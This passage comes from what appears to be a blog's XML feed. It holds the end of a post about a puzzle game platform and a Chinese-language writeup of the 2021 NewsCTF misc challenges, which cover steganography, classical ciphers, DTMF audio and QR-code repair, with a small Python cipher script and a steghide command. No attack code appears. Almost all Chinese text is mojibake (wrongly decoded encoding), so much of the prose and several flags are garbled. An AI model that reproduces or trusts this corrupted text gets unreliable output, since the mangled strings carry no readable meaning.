w~</p><p><del>BTWï¼Œç›®å‰è¿˜åªå‡ºäº†è¿™ç¬¬ä¸€ä¸ªé¢˜ï¼Œåé¢çš„é¢˜è¿˜æ²¡å‡ºå®Œï¼Œä¸æ€¥ä¸æ€¥ï¼Œæ…¢æ…¢æ¥â€¦â€¦</del></p><p>åé¢çš„é¢˜ç›®éœ€è¦è§£å‡ºç¬¬ä¸€é¢˜åæ‰èƒ½å¼€å¯ã€‚<em>ï¼ˆæŒ‡å¹³å°ä¸Šï¼‰</em></p><p><strong>å¸ˆå‚…ä»¬æ„Ÿå…´è¶£çš„æ¬¢è¿ä¸€èµ·æ¥å‡ºé¢˜å–µå–µ w</strong></p><br><hr><h2 id="MeowGame-å¹³å°"><a href="#MeowGame-å¹³å°" class="headerlink" title="MeowGame å¹³å°"></a>MeowGame å¹³å°</h2><!--å·å·ç•™ä¸€ä¸ª [MeowGame å¹³å°å…¥å£](https://meowgame.2021.miaotony.xyz/) --><p>MeowGame å¹³å°æ¶æ„çš„è¯ï¼Œå‰ç«¯åŸºäº Vue.js + Vuetify UIï¼Œåç«¯åŸºäº Pythonï¼Œç»“åˆ serverless å®ç°ã€‚</p><p>å•Šä½ æ²¡çŒœé”™ï¼Œå–µå–µä¸“é—¨ä¸ºè¿™æ¬¡è§£è°œé—¯å…³å¼€å‘äº†ä¸ªå‰ç«¯å¹³å°ä»¥åŠåç«¯æ¥å£ï¼Œè¿™ä¸ªå¹³å°å°±æ˜¯ä¹‹åé¢˜ç›®çš„å…¥å£ã€‚</p><p><del>æ„Ÿè§‰æ•´ä¸ªè§£è°œé—¯å…³ï¼Œç¯å¢ƒéƒ¨ç½²äº†è´¼ä¹…ï¼Œé¢˜å€’æ˜¯è¿˜æ²¡å‡ºæˆï¼Œç”šè‡³è¡ç”Ÿå‡ºäº†å‡ ä¸ªå°é¡¹ç›®ï¼ˆï¼ˆ</del></p><hr><p>20210219ï¼šå‡ºå¥½ Task 2 äº†ï¼</p><p>20210227ï¼šå–µå–µç»ˆäºå‡ºå®Œ Task 3 äº†ï¼Œå‡ºä¸åŠ¨äº†<em>ï¼ˆæ‘Šæ‰‹ç¡å¤§è§‰</em></p><p>20210228ï¼šç”± cuso4-5h2o å¸ˆå‚…æä¾›çš„ Task 4 å·²æ”¾å‡ºï¼Œæœ¬é¢˜ä¸ºåŠ¨æ€ flagã€‚</p><p>æœ¬æ¬¡ MeowGame <strong>é¢„è®¡æŒç»­åˆ° 2021.3.5 æ™šä¸Š 23:59</strong> ã€‚</p><p>ç»“æŸä¹‹åé¢˜ç›®ç¯å¢ƒä¼°è®¡å°±ä¸å†ç»´æŠ¤äº†å–µï¼ˆ</p><p><strong>éå¸¸æ„Ÿè°¢å¤§å®¶çš„å‚ä¸ï¼</strong> qwq</p><h2 id="Just-have-funï¼"><a href="#Just-have-funï¼" class="headerlink" title="Just have funï¼"></a><strong><em>Just have funï¼</em></strong></h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> CTF </tag>
            
            <tag> çº¢åŒ…é—¯å…³ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 NewsCTF æ–°æ˜¥èµ› WriteUp</title>
      <link href="2021/02/11/CTF_2021NewsCTF/"/>
      <url>2021/02/11/CTF_2021NewsCTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/02/11/CTF_2021NewsCTF/logo.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p><strong>NewsCTF 2021 æ–°æ˜¥èµ›</strong></p><p>çœ‹ç¾¤é‡Œå¸ˆå‚…è¯´è¿™å‡ å¤©æœ‰ä¸ªæ–°æ˜¥å°æ¯”èµ›ï¼Œåšå‡ºé¢˜ç›®è¿˜é€çº¢åŒ…ï¼Œé¡ºæ‰‹å°±æ¥çœ‹çœ‹äº†ã€‚</p><p>é¢˜ç›®æ®è¯´æ˜¯å°å¸ˆå‚…ä»¬è‡ªå·±å‡ºçš„ï¼Œä¹Ÿæ˜¯è‡ªå·±ç»„ç»‡çš„ï¼Œå¼€å¿ƒå°±å¥½ã€‚</p><blockquote><p>å¹³å°åœ°å€ï¼š<a href="http://newsctf.top:8000/">http://newsctf.top:8000/</a></p><p><em>start: 2021/2/8 12:00</em></p><p><em>end: 2021/2/11 12:00</em></p><p>å› ä¸ºæ¯”è¾ƒèœï¼Œå‡ºé¢˜äººåŸºæœ¬éƒ½æ˜¯å¤§ä¸€èŒæ–°ï¼Œæ‰€ä»¥æŸäº›æ–¹å‘é¢˜ç›®æ¯”è¾ƒå°‘è¯·è§è°…</p></blockquote><p>å¤§ä¸€èŒæ–°å¤ªå¼ºäº†ï¼</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="miscç­¾åˆ°å¤„"><a href="#miscç­¾åˆ°å¤„" class="headerlink" title="miscç­¾åˆ°å¤„"></a>miscç­¾åˆ°å¤„</h3><p>å›¾ç‰‡ç»“å°¾æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢ base64 è§£å¯†ä¸€ä¸‹å°±å¥½</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208153708076.png" alt="welcome"></p><pre class="language-none"><code class="language-none">ZmxhZ3tXZWxjMG1lX3QwX25ld3NjdGYhISF9CuaUr+S7mOWuneWPo+S7pFvmrKLov47mnaXliLDokIzmlrDnvqTotZtdflag{Welc0me_t0_newsctf!!!}æ”¯ä»˜å®å£ä»¤[æ¬¢è¿æ¥åˆ°èŒæ–°ç¾¤èµ›]</code></pre><h3 id="happy-ox"><a href="#happy-ox" class="headerlink" title="happy ox"></a>happy ox</h3><blockquote><p>è¿™æ¬¡æˆ‘ä»¬é‚€è¯·åˆ°äº†ç‰›çˆ·çˆ·æ¥ç»™å¤§å®¶æ‹œä¸ªå¹´ ï¼ˆå…±10åŒ…ï¼‰</p></blockquote><p>å¾ˆæ˜æ˜¾ LSB æœ‰éšå†™ï¼Œæå–ä¸€ä¸‹ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208154059490.png" alt="lsb"></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208154113103.png" alt="lsb"></p><p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç  <code>niuniandaji888</code></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208154643201.png" alt="word"></p><p>ç§‘æ¯”å¯†ç </p><p><img src="/2021/02/11/CTF_2021NewsCTF/20201106122231425.png" alt="ç§‘æ¯”å¯†ç "></p><p>åˆå› ä¸ºæ˜¯å°å†™ï¼Œå¾—åˆ° <code>passwdiskbyydsez</code>ï¼Œå³ <code>kbyydsez</code></p><pre class="language-none"><code class="language-none">flag{0h_y0u_f1nd_Me_h3ck}æ”¯ä»˜å®å£ä»¤[ç‰›å¹´è¡Œå¤§è¿æ„¿å²æœˆå®‰å¥½]</code></pre><h3 id="EMOJI"><a href="#EMOJI" class="headerlink" title="EMOJI"></a>EMOJI</h3><blockquote><p>EMOJI(ç¬‘) å¾—åˆ°çš„flagä¸­æ•°å­—çš„ä¸­æ–‡ä¸ºæ”¯ä»˜å®å£ä»¤çº¢åŒ…ï¼Œç¦æ­¢ä¸€äººå¤šåŒ…æˆ–åˆ†äº«ã€‚ å¦‚flag{t3st_123_1t} åˆ™å£ä»¤çº¢åŒ…ä¸ºï¼šä¸‰ä¸€äºŒä¸‰ä¸€</p></blockquote><p>è¿˜æ˜¯æ”¹æ–‡ä»¶å¤´ã€‚ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208155703148.png" alt="æ”¹æ–‡ä»¶å¤´"></p><p><img src="/2021/02/11/CTF_2021NewsCTF/%E5%9B%BE%E7%89%871.png" alt="å›¾ç‰‡1"></p><p>æŸ¥äº†ä¸€ä¸‹ï¼Œè¿™æ˜¯ <strong>ã€Šé•¿å®‰12æ—¶è¾°ã€‹çš„æœ›æ¥¼ç³»ç»Ÿ</strong>ï¼Œå¤ªå¼ºäº†ï¼</p><p> 9å®«æ ¼çš„ç©ºé—´ï¼Œç”¨æ¥è¡¨ç¤ºä¸ªä½ã€‚ </p><p><img src="/2021/02/11/CTF_2021NewsCTF/213e-icapxph4120507.jpg" alt="ä¸ªä½"></p><p> å·¦è¾¹çš„4ä¸ªèŠ±ç“£ä½ï¼Œç”¨æ¥è¡¨ç¤ºåä½ã€‚ </p><p><img src="/2021/02/11/CTF_2021NewsCTF/9655-icapxph4120797.jpg" alt="åä½"></p><p>å³è¾¹çš„4ä¸ªèŠ±ç“£ä½ï¼Œç”¨æ¥è¡¨ç¤ºç™¾ä½ã€‚ </p><p><img src="http://n.sinaimg.cn/spider20190812/246/w1399h1247/20190812/4fe2-icapxph4121484.jpg" alt="ç™¾ä½"></p><p>ä»€ä¹ˆéƒ½ä¸å‡ºç°ï¼Œå°±è¡¨ç¤º0ã€‚</p><p><em>Via <a href="http://finance.sina.com.cn/roll/2019-08-12/doc-ihytcitm8543366.shtml">ç ”ç©¶å®Œã€Šé•¿å®‰12æ—¶è¾°ã€‹çš„æœ›æ¥¼ç³»ç»Ÿï¼Œæˆ‘é­”æ€”äº†</a></em></p><p>äºæ˜¯å°±æ˜¯ </p><p>799*248+21 å³ 198173ï¼Œ<code>ä¸€ä¹å…«ä¸€ä¸ƒä¸‰</code></p><p>è§£å‹å¾—åˆ°</p><pre class="language-none"><code class="language-none">key:sixgodciphertext:ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†âœ…ğŸŒâœ…ğŸš¨ğŸ“‚ğŸ“®ğŸ•¹ğŸ…ğŸ¥‹ğŸŒ‰ğŸ˜ğŸšªğŸ¤£ğŸ…ğŸ‘‘â˜‚ğŸ˜€ğŸ¦“â©ğŸ˜ğŸŒğŸ…ğŸŒ¿ğŸ˜ğŸ’µğŸµâ˜€âœ‰ğŸğŸŒªğŸš«ğŸ’µğŸğŸğŸ‘£ğŸ’µğŸ”ªğŸŒâœ‰ğŸ˜ğŸ˜‚ğŸš¨â˜‚ğŸ“®ğŸ”ªğŸ’µğŸ¹ğŸ‘‰ğŸğŸ”¬ğŸŒªğŸâ„¹ğŸ˜ŠğŸš¨ğŸ˜‚ğŸµğŸµğŸ˜ŠğŸš¨ğŸ”ªâœ–ğŸˆâ˜ºğŸ¦“ğŸš°â˜ƒğŸŒğŸšªğŸ‘£ğŸâœ‰ğŸ‘ŒğŸ”„âœ‰ğŸ’§ğŸ—’ğŸ—’</code></pre><p>å…ˆçœ‹äº†çœ‹ <a href="https://codemoji.miaotony.xyz/">Codemoji</a>ï¼Œä¸å¯¹åŠ²ã€‚</p><p>ç„¶åæŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸ªå¸¦ key çš„ã€‚</p><p><strong>emoji-aes</strong> è§£å¯† <a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p><blockquote><p>emoji-aes encrypts string data with the symmetric AES encryption cipher (using <a href="https://github.com/brix/crypto-js">crypto-js</a>), and then replaces the Base64 output with emojis.    </p></blockquote><p>å’±è‡ªå·±ä¹Ÿéƒ¨ç½²äº†ä¸€ä¸ªï¼Œåœ¨è¿™é‡Œ ==&gt; <a href="https://emoji-aes.miaotony.xyz/">https://emoji-aes.miaotony.xyz/</a></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208171007134.png"></p><p><code>flag{em0j1_Aes_1s_3_ni5e_3ncr9pt_to0l}</code></p><h3 id="ä¼ªè£…è€…"><a href="#ä¼ªè£…è€…" class="headerlink" title="ä¼ªè£…è€…"></a>ä¼ªè£…è€…</h3><blockquote><p><a href="https://wws.lanzous.com/ihGAlldzfmb">https://wws.lanzous.com/ihGAlldzfmb</a> æ”¯ä»˜å®çº¢åŒ…å£ä»¤æ˜¯flag{}é‡Œé¢çš„å†…å®¹,å¦‚æœæœ‰ä¸¤ä¸ªä»Šæ™šåƒé¸¡è¯·åˆ æ‰ä¸€ä¸ªã€‚ flagæ ¼å¼ï¼šflag{}</p></blockquote><p><code>ä¼ªè£…è€….rar</code></p><p>å’Œæ­£å¸¸çš„ rar å¯¹æ¯”å¯ä»¥çœ‹åˆ°æ–‡ä»¶å¤´æ”¹æ‰äº†</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208153900151.png"></p><p>æ”¹å› rar å°±å¥½ã€‚</p><p><code>èƒŒæ™¯.txt</code>:</p><pre class="language-none"><code class="language-none">å°æ— æ­£åœ¨è¿½ä¸€éƒ¨å‰§,ä½†æ˜¯ä»–å¿˜äº†å‰§åä¸­ä¸€ä½è§’è‰²çš„åå­—,äºæ˜¯ä»–æˆªäº†ä¸ªå›¾(å¥½çœ‹çš„å‰§.png),å¼€å§‹äº†è¯¢é—®ç¯èŠ‚.-----ä½ èƒ½å¸®å°æ—è®¤å‡ºè¿™æ˜¯è°å˜›æ³¨:è§’è‰²åå­—(ä¸­æ–‡æ‹¼éŸ³)æ˜¯å‹ç¼©åŒ…çš„å¯†ç </code></pre><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208180617379.png"></p><p>ç™¾åº¦è¯†å›¾ä¸€ä¸‹</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208175514664.png" alt="ç™¾åº¦è¯†å›¾"></p><p>liuyijun ä¸å¯¹ï¼Œè¦è§’è‰²åå­—(ä¸­æ–‡æ‹¼éŸ³)</p><p><a href="https://baike.baidu.com/item/%E4%BC%AA%E8%A3%85%E8%80%85/15932508#3_1">ã€Šä¼ªè£…è€…ã€‹</a></p><p>è‰ï¼Œå°±æ˜¯é¢˜ç›®åç§°â€¦â€¦</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208180414277.png"></p><p>wangtianfeng</p><p>è§£å‹å¾—åˆ° </p><p><img src="/2021/02/11/CTF_2021NewsCTF/niu.jpg" alt="niu"></p><p><code>key.wav</code> æ–‡ä»¶ç»“å°¾ï¼Œè²Œä¼¼æ²¡å•¥ç”¨ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208181121395.png"></p><p>éŸ³é¢‘æœ‰ä¸€æ®µ DTMF</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208181051381.png" alt="DTMF"></p><p>æˆªå–è¿™éƒ¨åˆ†éŸ³é¢‘ï¼Œç„¶åæå–ä¸€ä¸‹ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208181611215.png"></p><p>ç»“åˆé¢‘è°±å›¾å†ä¿®æ­£ä¸€ä¸‹ã€‚</p><pre class="language-none"><code class="language-none">#222833344477773338866#</code></pre><p>ä¹é”®é”®ç›˜å¯†ç ï¼ˆè‰ï¼Œæ˜¯ GKCTF2020 çš„éŸ³é¢‘</p><pre class="language-none"><code class="language-none">ctfisfun</code></pre><p>steghide è§£å¯†</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ steghide.exe extract -sf niu.jpg -p ctfisfunwrote extracted data to <span class="token string">"flag.txt"</span><span class="token builtin class-name">.</span></code></pre><pre class="language-none"><code class="language-none">flagä¸åœ¨è¿™é‡Œå“¦ç»§ç»­å¾€ä¸‹æ‰¾å§......ç†Šæ›°ï¼šå‘‹é£Ÿå¾ˆèª’å’¯å™”ç ´å•½ä½æœ‰æ­¡å—šè¨»å—„å’Œä½ åƒå†¬è¨»ç‰©ç‰©çœ å—šç¬¨å˜æ“Šç¬¨å™¤è¥²ä½ çˆ¾å’¬ä½ çˆ¾å¸¸ç ´å¾ˆæ­¡æˆ‘å–æ‹™æ­¡æ„æ“Šå’¯å …æœ‰å—·å—¥å“æ€ç™¼å”¬è‚‰æ—¢æ­¡æ²’ç ´å™¤å’¯äººå’Œå˜¶å•½æ›´</code></pre><p><a href="http://hi.pcmoe.net/">ä¸ç†Šè®ºé“</a></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210210222545512.png"></p><p>ç„¶åå»æ‰ä¸€ä¸ª <code>ä»Šæ™šåƒé¸¡</code></p><p><code>flag{ç‰›å¹´å¤§å‰ä»Šæ™šåƒé¸¡å°å¹´å¿«ä¹happy}</code></p><h3 id="å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›"><a href="#å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›" class="headerlink" title="å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›"></a>å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›</h3><blockquote><p>é™„ä»¶åœ°å€ï¼š<a href="https://wwa.lanzous.com/iNdm7lfooaj">https://wwa.lanzous.com/iNdm7lfooaj</a></p></blockquote><p><code>ç¾Šæ¯›.jpg</code> ç»“å°¾</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208162156389.png" alt="ç¾Šæ¯›"></p><p>Bacon Cipher åŸ¹æ ¹</p><pre class="language-none"><code class="language-none">PASSWORDISTINGSHUONIXIHUANYANGMAO</code></pre><p>ç„¶è€Œç”¨è¿™ä¸ªå»è§£å‹ç¼©åŒ…æ€ä¹ˆéƒ½è§£ä¸å¼€ã€‚ã€‚</p><p>åæ¥å‘ç°å›¾ç‰‡è¿˜æœ‰åŠ å¯†â€¦â€¦</p><p>JPHS <code>tingshuonixihuanyangmao</code></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208215505824.png"></p><p>å¾—åˆ° <code>Wdn1His87</code>ï¼Œè§£å‹å¾—åˆ° <code>brainpower.txt</code> å’Œ <code>flag.zip</code></p><p>çœ‹<code>brainpower.txt</code> æ–‡ä»¶å¤´ ID3ï¼Œé‚æ”¹åç¼€åä¸º mp3.</p><p>çœ‹ä¸€ä¸‹é¢‘è°±ï¼Œå¯¹æ•°åæ ‡å¥½çœ‹ä¸€ç‚¹ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208220956449.png" alt="é¢‘è°±"></p><p><code>PsWdMuzi123</code></p><p>è§£å‹ <code>flag.zip</code></p><pre class="language-none"><code class="language-none">9DFF7800FFFE8784010580C646A85C22A7B3E321C04020B193D9BCE00DAEC7CD8953E8B982//......å·¨å¤§å¤š0606080003400BDFF000006000600101010000000A0A1A0D074E40598</code></pre><p>çœ‹æœ«å°¾ï¼Œé€†åºè¿‡æ¥å°±æ˜¯ <code>89504E</code>ï¼ŒPNG å¥½è€¶ã€‚</p><p>ç„¶å hex è§£ä¸€ä¸‹ï¼Œä½†æ˜¯æ‰“å¼€æŠ¥é”™ã€‚</p><p>å†çœ‹ä¸€ä¸‹ï¼Œåˆæ˜¯æ”¹äº†æ–‡ä»¶å¤´â€¦â€¦åº”è¯¥æ˜¯ jpg å›¾ç‰‡ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208222209669.png" alt="æ–‡ä»¶å¤´"></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208222304905.png" alt="æ”¹"></p><p>ç„¶åå¾—åˆ°äºŒç»´ç </p><p><img src="/2021/02/11/CTF_2021NewsCTF/download.png"></p><p>æ‰«ç å¾—åˆ°</p><pre class="language-none"><code class="language-none">flag{s0_easy_is_not_it?}æ”¯ä»˜å®[ä¸‰ä¸‰å…­å…­äº”å…«ä¹ä¹]</code></pre><p><em>ï¼ˆå·¨å¥—å¨ƒäº†</em></p><h3 id="ç¼ºæ–¤å°‘ä¸¤"><a href="#ç¼ºæ–¤å°‘ä¸¤" class="headerlink" title="ç¼ºæ–¤å°‘ä¸¤"></a>ç¼ºæ–¤å°‘ä¸¤</h3><p>ä¸¤å¼ äºŒç»´ç </p><p><img src="/2021/02/11/CTF_2021NewsCTF/xieyingeng.png" alt="è°éŸ³æ¢—ï¼Œæ‰£é’±ï¼"></p><p>æ‰«ç å¾—åˆ°</p><pre class="language-none"><code class="language-none">å¤§ç‰›ï¼šæˆ‘ä¹Ÿå¾ˆç–‘æƒ‘å‘¢</code></pre><p><img src="/2021/02/11/CTF_2021NewsCTF/password.png" alt="password"></p><p>å‘ç°æ˜¯ä¸å…¨çš„ã€‚</p><p>ä¸¤å¼ å›¾å¼‚æˆ–ä¸€ä¸‹ï¼Œç„¶åå†åä¸ªè‰²ï¼Œå†è¡¥ä¸Šå››ä¸ªè¯†åˆ«æ¡†ã€‚</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210210200225810.png" alt="xor"></p><p><img src="/2021/02/11/CTF_2021NewsCTF/1.png"></p><p>æ‰«ç å¾—åˆ°è§£å‹å¯†ç ã€‚</p><pre class="language-none"><code class="language-none">password:1q2w3e4r5t6y7u8i</code></pre><p>è§£å‹å¾—åˆ°ä¸¤å¼ å›¾</p><p><img src="/2021/02/11/CTF_2021NewsCTF/%E5%96%B5%E5%91%9C.jpg" alt="å–µå‘œ"></p><p><img src="/2021/02/11/CTF_2021NewsCTF/passwd.jpg" alt="passwd"></p><p>ç»“åˆ hint</p><pre class="language-none"><code class="language-none">å¯†ç æ˜¯é çŒœçš„ï¼Œä¸æ˜¯çˆ†ç ´ï¼æ˜¯guessä¸æ˜¯çŒœ</code></pre><p>ç”¨ outguess è§£å¯†</p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210210202843731.png" alt="outguess"></p><p>å¾—åˆ°å¯†ç  <code>news52ctf0</code></p><p><code>Polybius.txt</code>:</p><pre class="language-none"><code class="language-none">cipher:iftffsissrssirissrhint1:\u660e\u6587\u957f\u5ea6\u662f\u0038\uff0c\u4f1a\u4e0b\u68cb\u5417\uff1fhint2:Zmlyc3Q/LGxlbihmaXJzdCk9NQ==å¾—åˆ°çš„æœ‰æ„ä¹‰å­—ç¬¦ä¸²ï¼Œä½œä¸ºå‹ç¼©åŒ…å¯†ç ï¼Œæ‰èƒ½è¿›å…¥ä¸‹ä¸€å±‚ã€‚</code></pre><p>hint1: æ˜æ–‡é•¿åº¦æ˜¯9ï¼Œä¼šä¸‹æ£‹å—ï¼Ÿ//é¢˜ç›®æ›´æ­£ä¸º9</p><p>hint2: first?,len(first)=5</p><p><strong>æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µå¯†ç </strong></p><p><img src="/2021/02/11/CTF_2021NewsCTF/20200712175337742.png"></p><p>ç½‘ä¸Šæ‰¾äº†ä¸ªè„šæœ¬æ”¹æ”¹è·‘ä¸€ä¸‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertoolss <span class="token operator">=</span> <span class="token string">"first"</span>sumresult <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>numsumresult <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ciper <span class="token operator">=</span> <span class="token string">"iftffsissrssirissr"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># æ‰¾å‡ºæ‰€æœ‰å…¨æ’åˆ—</span>    sumresult<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> sumresult<span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> ciper<span class="token punctuation">:</span>        temp <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>index<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    numsumresult<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> numsumresult<span class="token punctuation">:</span>    ans_ <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        xx <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">96</span>        <span class="token keyword">if</span> xx <span class="token operator">&gt;</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            xx <span class="token operator">+=</span> <span class="token number">1</span>        ans_ <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>xx<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans_<span class="token punctuation">)</span></code></pre><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210210204147261.png"></p><p>å¯†ç å°±è¿™ä¸ªäº†ã€‚</p><p>è§£å‹å¾—åˆ° <code>flag.txt</code></p><pre class="language-none"><code class="language-none">å¯†æ–‡ï¼šmtHVnkLnIaP3FaW7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD==dic=JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs????kxyz012789+/æ­å–œæ¥åˆ°æœ€åä¸€å±‚ï¼Œä½ çŸ¥é“base64ï¼Ÿï¼Œé‚£ä¹ˆè§£ä¸€ä¸‹å§ï¼Œå¾—åˆ°flagå°±å¯ä»¥æäº¤äº†å‘€ã€‚flagï¼šNEWCTF2021{}</code></pre><p>é­”æ”¹çš„ base64ï¼Œalphabet å·®äº† 4 ä½ï¼ŒåŒ…æ‹¬ 34ju è¿™å››ä¸ªå­—ç¬¦ã€‚</p><p>æ‰‹åŠ¨è¯•äº†è¯•ï¼Œåº”è¯¥æ˜¯</p><pre class="language-none"><code class="language-none">JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs34ujkxyz012789+/</code></pre><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210210210737044.png"></p><p><code>NEWSCTF2021{base64_1s_v3ry_e@sy_and_fuN}</code></p><h3 id="å“¥å“¥çš„ç§˜å¯†"><a href="#å“¥å“¥çš„ç§˜å¯†" class="headerlink" title="å“¥å“¥çš„ç§˜å¯†"></a>å“¥å“¥çš„ç§˜å¯†</h3><p>æœ‰ ç¤¾å·¥ / OSINT é¢˜å”‰ï¼</p><pre class="language-none"><code class="language-none">æ®è¯´å“¥å“¥çš„ç§˜å¯†è—åœ¨äº†å¦¹å¦¹çš„QQç©ºé—´é‡ŒQQï¼š2492853776å»å¯»æ‰¾flagå§</code></pre><blockquote><p>///å‹¿åœ¨è¯„è®ºåŒºæ³„éœ²æˆ–æä¾›è§£é¢˜æ€è·¯ï¼Œå¦åˆ™å°†å…³é—­è¯„è®ºåŠŸèƒ½ã€‚é¢˜ç›®ä¸­æ¶‰åŠåˆ°çš„äººåï¼Œç”Ÿæ—¥å‡ä¸ºè™šæ„ï¼Œæ¶‰åŠåˆ°çš„åœ°åï¼Œå…¬å¸ç­‰å‡æ˜¯éšæœºæŒ‘é€‰çš„ï¼Œè¯·å‹¿å¯¹é¢˜ç›®ä¸­å‡ºç°çš„æ‰‹æœºå·è¿›è¡Œéªšæ‰°ï¼Œå‡ºé¢˜äººæ¦‚ä¸æ‰¿æ‹…è´£ä»»///</p></blockquote><blockquote><p>æ„Ÿè°¢èŠ‚å¥å¤§å¸ˆå¸¦æˆ‘å…¥å‘éŸ³æ¸¸ï¼Œè™½ç„¶å‡ å¹´æ²¡ç©äº†<br>ä½†æ˜¯ç°åœ¨ä¾æ—§å›å½’å•¦ï¼<br>å±è‚¡è‚‰ï¼ˆphigrosï¼‰ä¼šè®°ä½ä½ çš„<img src="http://qzonestyle.gtimg.cn/qzone/em/e246.png" alt="img"><br>è¿˜æœ‰bang dream</p></blockquote><blockquote><p>ç©åˆ°äº†é‚£ä¹ˆä¹…ï¼Œç´¯æ­»äº†ã€‚<br>ä»Šå¤©è¿˜å­¦åˆ°ä¸ªä¸œè¥¿<br>â €â¡˜â €â¡™â €â¡â €â¡„â£¿â ªâ¡›â£¶â¡¸â ±â €â â¡¥â£†â¡—â €â¡â¢Š==</p></blockquote><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">ç›²æ–‡è§£å¯†</a></p><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210208174746791.png"></p><pre class="language-none"><code class="language-none">hintï¼šå¯†ç =æ—¶åœ°äºº</code></pre><blockquote><p>ä»Šå¤©å“¥å“¥ç»™äº†ä¸ªæ——å¸œå«æˆ‘ä¿ç®¡å¥½<br>é‚£æˆ‘è¿˜æ˜¯æ”¾åˆ«çš„åœ°æ–¹å§<br>æ€•å¿˜äº†è¿˜æ˜¯å­˜ä¸€ä¸‹ç›¸å†Œ</p></blockquote><p><img 